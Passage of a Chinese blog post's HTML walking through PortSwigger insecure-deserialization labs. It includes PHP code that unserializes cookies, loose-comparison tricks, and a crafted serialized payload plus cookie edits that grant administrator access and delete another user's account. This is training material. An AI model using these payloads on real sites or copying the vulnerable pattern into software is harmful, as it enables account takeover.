@@ -1,0 +1,1925 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="PortSwigger-不安全的反序列化, 芜风">
+    <meta name="description" content="且将新火试新茶，诗酒趁年华">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>PortSwigger-不安全的反序列化 | 芜风</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 6.1.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">芜风</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">芜风</div>
+        <div class="logo-desc">
+            
+            且将新火试新茶，诗酒趁年华
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">PortSwigger-不安全的反序列化</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">web安全</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/Port/" class="post-category">
+                                Port
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-04-10
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.9k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    15 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>PortSwigger-不安全的反序列化，Insecure deserialization</p>
+<span id="more"></span>
+<h1 id="PortSwigger-不安全的反序列化"><a href="#PortSwigger-不安全的反序列化" class="headerlink" title="PortSwigger-不安全的反序列化"></a>PortSwigger-不安全的反序列化</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><ul>
+<li>刷这个专题的时候是有一点反序列化漏洞的基础了，主要是 PHP 的反序列化，魔法函数的使用。所以对序列化已经有一点基础的了解了。</li>
+</ul>
+<h2 id="0x02-概念明晰"><a href="#0x02-概念明晰" class="headerlink" title="0x02 概念明晰"></a>0x02 概念明晰</h2><blockquote>
+<p>先弄懂序列化，反序列化，不安全的反序列化都是什么</p>
+</blockquote>
+<h3 id="1-序列化是什么，反序列化是什么"><a href="#1-序列化是什么，反序列化是什么" class="headerlink" title="1.序列化是什么，反序列化是什么"></a>1.序列化是什么，反序列化是什么</h3><ul>
+<li>序列化，将复杂的东西转化为编码的操作，比如将类转化成一串编码，实现方式是 <code>.serialization()</code></li>
+</ul>
+<p>以这串 php 代码为例，体验一下序列化</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">"carlos"</span><span class="token punctuation">;</span> 
+<span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isLoggedIn</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+
+输出—<span class="token operator">></span> O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"User"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;s:4:</span><span class="token string">"name"</span><span class="token punctuation">:</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"carlos"</span><span class="token punctuation">;</span> s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"isLoggedIn"</span><span class="token punctuation">:</span>b<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+
+O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"User"</span> <span class="token operator">-</span> 具有 <span class="token number">4</span> 个字符的类名的对象 <span class="token string">"User"</span>
+<span class="token number">2</span> <span class="token operator">-</span> 对象有<span class="token number">2</span>个属性
+s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"name"</span> <span class="token operator">-</span> 第一个属性的键是 <span class="token number">4</span> 个字符的字符串 <span class="token string">"name"</span>
+s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string">"carlos"</span> <span class="token operator">-</span> 第一个属性的值是 <span class="token number">6</span> 个字符的字符串 <span class="token string">"carlos"</span>
+s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"isLoggedIn"</span> <span class="token operator">-</span> 第二个属性的键是 <span class="token number">10</span> 个字符的字符串 <span class="token string">"isLoggedIn"</span>
+b<span class="token punctuation">:</span><span class="token number">1</span> <span class="token operator">-</span> 第二个属性的值是布尔值 <span class="token boolean">true</span>
+</code></pre>
+<hr>
+<ul>
+<li>反序列化，将编码转换为复杂的东西，比如将编码转换为一个类，实现方式是 <code>.deserialization</code></li>
+</ul>
+<p>以这串 php 代码为例，体验一下反序列化</p>
+<pre class=" language-php"><code class="language-php"> <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">'O%3A4%3A%22test%22%3A2%3A%7Bs%3A10%3A%22%00test%00flag%22%3Bs%3A9%3A%22flag%7B233%7D%22%3Bs%3A1%3A%22a%22%3Bs%3A3%3A%22aaa%22%3B%7D'</span><span class="token punctuation">;</span>
+
+ <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ <span class="token delimiter">?></span>
+     
+输出<span class="token operator">--</span><span class="token operator">-</span><span class="token operator">></span> O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;s:10:</span><span class="token string">"testflag"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"flag&amp;#123;233&amp;#125;"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"aaa"</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+</code></pre>
+<p>序列化与反序列化之间可以互相转换，也就是说，我序列化操作过去的东西，一定能够通过反序列化原模原样得拿回来，原理如图所示。</p>
+<img src="/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/deserialization-diagram.png" class="">
+
+<h3 id="2-什么是不安全的反序列化"><a href="#2-什么是不安全的反序列化" class="headerlink" title="2. 什么是不安全的反序列化"></a>2. 什么是不安全的反序列化</h3><blockquote>
+<p>不安全的反序列化是指进行<strong>序列化与反序列化操作的数据</strong>可以被用户控制，从而使得用户得以操作序列化对象，造成各种攻击。</p>
+</blockquote>
+<p>不安全的反序列化主要被分为两类：</p>
+<h4 id="序列化对象被替换"><a href="#序列化对象被替换" class="headerlink" title="序列化对象被替换"></a>序列化对象被替换</h4><p>这种不安全的反序列化，应用最多的便是 Public 的对象被修改为 Private，轻则替换类的范围(也就是 Public，Private 之间的)；重则替换一整个类，将序列化对象替换为完全不同类的对象。因此，不安全的反序列化有时称为 “对象注入” 漏洞。</p>
+<h4 id="在反序列化之前发生异常，导致反序列化直接被跳出"><a href="#在反序列化之前发生异常，导致反序列化直接被跳出" class="headerlink" title="在反序列化之前发生异常，导致反序列化直接被跳出"></a>在反序列化之前发生异常，导致反序列化直接被跳出</h4><ul>
+<li>最有代表性的可以是 php 反序列化中的 <code>__destruct</code> 魔法函数，师傅们可以移步至 <a target="_blank" rel="noopener" href="https://withd-raw.github.io/2022/04/03/HackTheBox-Toxic/">php反序列化</a> 观看</li>
+</ul>
+<p>这种情况在 Port 官方靶场上被称作意外类的对象导致的异常。</p>
+<h3 id="3-产生不安全的反序列化的根本原因"><a href="#3-产生不安全的反序列化的根本原因" class="headerlink" title="3. 产生不安全的反序列化的根本原因"></a>3. 产生不安全的反序列化的根本原因</h3><blockquote>
+<p>一句话总结：过于信任用户的输入</p>
+</blockquote>
+<h3 id="4-不安全的反序列化的危害"><a href="#4-不安全的反序列化的危害" class="headerlink" title="4. 不安全的反序列化的危害"></a>4. 不安全的反序列化的危害</h3><ul>
+<li>最有可能的是 RCE，我们熟知的 Shiro 550，Shiro 721 以及其他的一些反序列化漏洞。</li>
+<li>其他次要一些的有提权、任意文件读取、DDoS、信息泄露</li>
+</ul>
+<h2 id="0x03-开打！不安全反序列化的利用"><a href="#0x03-开打！不安全反序列化的利用" class="headerlink" title="0x03 开打！不安全反序列化的利用"></a>0x03 开打！不安全反序列化的利用</h2><h3 id="1-判断不安全的反序列化的存在"><a href="#1-判断不安全的反序列化的存在" class="headerlink" title="1. 判断不安全的反序列化的存在"></a>1. 判断不安全的反序列化的存在</h3><h4 id="什么叫判断漏洞存在"><a href="#什么叫判断漏洞存在" class="headerlink" title="什么叫判断漏洞存在"></a>什么叫判断漏洞存在</h4><ul>
+<li>判断漏洞存在的意思比较好理解，也就是证明当前界面存在某个漏洞。例如我们要证明某个 Web 中存在 XSS，我们只需要构造 alert(1) 的 POC 即可。对于不安全的反序列化也是一样。<h4 id="如何识别不安全的反序列化漏洞"><a href="#如何识别不安全的反序列化漏洞" class="headerlink" title="如何识别不安全的反序列化漏洞"></a>如何识别不安全的反序列化漏洞</h4>识别不安全的反序列化比较简单，不论是在黑盒测试还是白盒测试当中。</li>
+</ul>
+<p>在渗透测试的过程中，抓包查看数据，审计看起来像序列化是数据，例如 token，session 的地方。对这些地方进行测试，观察能否控制输入。</p>
+<p>像这串 demo 代码，Cookie 便是一个易受攻击的反序列化点，在任何时候都不会检查 Cookie 对象的真实性，在这种情况下，会造成很多漏洞。</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">isAdmin</span> <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> 
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span><span class="token comment" spellcheck="true">// allow access to admin interface &amp;#125;</span>
+</code></pre>
+<ul>
+<li>直接来看一道靶场，详细感受一下什么叫不安全的反序列化。</li>
+</ul>
+<blockquote>
+<h5 id="Lab-Modifying-serialized-objects"><a href="#Lab-Modifying-serialized-objects" class="headerlink" title="Lab: Modifying serialized objects"></a>Lab: Modifying serialized objects</h5></blockquote>
+<p>题目让我们越权删除 Carlos 的账户。</p>
+<p>登录上 wiener 的账号，并在 &#x2F;Accout 接口下抓包，如图所示，我们上文说了，</p>
+<img src="/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/POCOfUnsafeUnserlization.png" class="">
+
+<p>将这一串 Session 提出来，进行 Base64 解码</p>
+<img src="/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Base64Wiener.png" class="">
+
+<p>猜测在 admin 边上的字段 b，是用来判断是否是 admin 权限的，于是将 “0” 修改为 “1”，再重新进行 base64 编码。</p>
+<img src="/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Change_bForAdmin.png" class="">
+
+<p>这里 “O30%3d” 需要单独拿出来，不需要进行 base64 编码。<br>接着，使用 “Show Response in browser”，<strong>注意</strong>，此时需要开启 Burpsuite 的代理模式，否则访问不通</p>
+<img src="/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/AdminLike.png" class="">
+
+<p>再进行删除即可，我自己做题的时候遇到了一点困难，但是对删除的包进行修改 Cookie，导致越权删除同样奏效。</p>
+<hr>
+<ul>
+<li>在上题当中，Cookie 就是过分信任用户的输入，易受用户修改，从而导致了不安全的反序列化，下面我们多讲一讲攻击手段。</li>
+</ul>
+<h3 id="2-修改数据类型"><a href="#2-修改数据类型" class="headerlink" title="2. 修改数据类型"></a>2. 修改数据类型</h3><p>修改数据类型多数出现在 PHP 弱判断的题目当中。</p>
+<h4 id="php中有两种比较的符号"><a href="#php中有两种比较的符号" class="headerlink" title="php中有两种比较的符号"></a>php中有两种比较的符号</h4><ul>
+<li>它们分别是 <code>==</code> 与  <code>===</code><pre class=" language-php"><code class="language-php"><span class="token number">1</span> <span class="token delimiter">&lt;?php</span>
+<span class="token number">2</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$b</span> <span class="token punctuation">;</span>
+<span class="token number">3</span> <span class="token variable">$a</span><span class="token operator">===</span><span class="token variable">$b</span> <span class="token punctuation">;</span>
+<span class="token number">4</span> <span class="token delimiter">?></span>
+</code></pre>
+</li>
+</ul>
+<blockquote>
+<p>&#x3D;&#x3D;&#x3D; 在进行比较的时候，先判断两种字符串的类型是否相等，再比较；三个等于号的判断方式被称作严格判断</p>
+<p>&#x3D;&#x3D; 在进行比较的时候，会先将字符串类型转化成相同，再比较。也被称作松散比较</p>
+</blockquote>
+<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">// php的"=="</span>
+<span class="token number">1</span> <span class="token delimiter">&lt;?php</span>
+<span class="token number">2</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//true</span>
+<span class="token number">3</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"1admin"</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//true</span>
+<span class="token number">4</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"admin1"</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//false</span>
+<span class="token number">5</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"admin1"</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//true</span>
+<span class="token number">6</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string">"0e123456"</span><span class="token operator">==</span><span class="token string">"0e4456789"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//true </span>
+<span class="token number">7</span> <span class="token delimiter">?></span>  <span class="token comment" spellcheck="true">//上述代码可自行测试</span>
+</code></pre>
+<p>当这种松散比较与<strong>过于信任用户输入</strong>同时出现时，肯定有洞。</p>
+<p>例如下面这一段逻辑判断代码，只要存储的密码不以数字开头，那么松散比较的返回结果始终为 True</p>
+<pre class=" language-php"><code class="language-php"><span class="token variable">$login</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">)</span> 
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$login</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>
+    <span class="token comment" spellcheck="true">// log in successfully </span>
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+</code></pre>
+<p>这时的你是否已经有攻击思路了呢，我们以 Port 靶场体验一下。</p>
+<blockquote>
+<h5 id="Lab-Modifying-serialized-data-types"><a href="#Lab-Modifying-serialized-data-types" class="headerlink" title="Lab: Modifying serialized data types"></a>Lab: Modifying serialized data types</h5></blockquote>
+<ul>
+<li>题目还是要求我们提权</li>
+</ul>
+<p>老样子抓包，拿 Cookie 分析</p>
+<img src="/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ModifyTypeBase64Decode.png" class="">
+
+<p>因为我们要以 “username&#x3D;administrator” 登录进去，所以这里的 username，我们从 wiener 修改为 administrator，同时对应 username 的 s (也就是 username 的长度) 要修改为 13。</p>
+<p>现在 username 修改好了，还剩 password，按照题意的话，是根据 access_token 验证身份的，所以我们这里猜测对应的 access_token 不含任何数字，构造 payload</p>
+<pre class=" language-php"><code class="language-php">O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"User"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;s:8:</span><span class="token string">"username"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token string">"administrator"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token string">"access_token"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+</code></pre>
+<p>再进行 base64 编码并发包</p>
+<img src="/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/WeakPHPAuth.png" class="">
+
+<p>成功提权，还是按照上题一样，在删除的接口下进行提权，直接删除。</p>
+<img src="/2022/04/10/PortSwigger-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/SuccWeakPHP.png" class="">
+
+<h3 id="3-使用应用程序功能，这里个人认为称作水平提权更合适"><a href="#3-使用应用程序功能，这里个人认为称作水平提权更合适" class="headerlink" title="3. 使用应用程序功能，这里个人认为称作水平提权更合适"></a>3. 使用应用程序功能，这里个人认为称作水平提权更合适</h3><ul>
+<li>所谓的使用应用程序功能，在不安全的反序列化当中，也就是水平提权。下面我们举个通俗易懂的例子。</li>
+<li>网站允许用户删除自己的数据的时候，我们作为普通用户，可以通过水平提权的方式删除同样是用户权限的其他人。而这个”删除”功能，就是所谓的 <strong>应用程序功能</strong>，所以我觉得称为水平提权更合理。</li>
+</ul>
+<p>对应的靶场</p>
+<blockquote>
+<h5 id="Lab-Using-application-functionality-to-exploit-insecure-deserialization"><a href="#Lab-Using-application-functionality-to-exploit-insecure-deserialization" class="headerlink" title="Lab: Using application functionality to exploit insecure deserialization"></a>Lab: Using application functionality to exploit insecure deserialization</h5></blockquote>
+<ul>
